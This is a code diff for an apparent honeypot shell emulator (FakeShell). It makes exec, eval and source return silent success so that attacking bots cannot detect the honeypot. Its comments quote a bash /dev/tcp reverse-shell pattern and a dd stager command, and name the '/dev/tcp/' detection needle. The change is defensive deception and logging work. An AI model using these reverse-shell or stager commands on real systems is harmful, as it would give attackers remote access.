@@ -1335,6 +1335,17 @@ String FakeShell::runOne_(Cmd& c) {
     // Bots clean up traces with these — silent success is correct.
     if (e=="unset" || e=="alias" || e=="unalias") return "";
     if (e=="ulimit" || e=="umask") return "";
+    // FS-CR-4: shell builtins that bots use to set up reverse-shell file
+    // descriptors. The most common pattern is `exec 5<>/dev/tcp/host/port;
+    // cat <&5` (bash network builtin) — exec falls through to "command
+    // not found" today, fingerprinting us. Silent success here makes the
+    // bot's subshell continue; the forensic record is already logged via
+    // detectReverseShell_ on c.raw, which catches the "/dev/tcp/" needle
+    // regardless of how it was wrapped. Same reasoning for eval/source/
+    // command/builtin: real shells silently treat them as evaluable
+    // wrappers, and the inner content is what matters forensically.
+    if (e=="exec" || e=="eval" || e=="source" || e=="." ||
+        e=="command" || e=="builtin") return "";
     // dd is used both for system probing (`dd if=/dev/zero ...`) and as
     // a stager (`dd bs=52 count=1 if=.s of=/tmp/x`). Silent success +
     // optional file creation is enough for the bot's flow to continue.
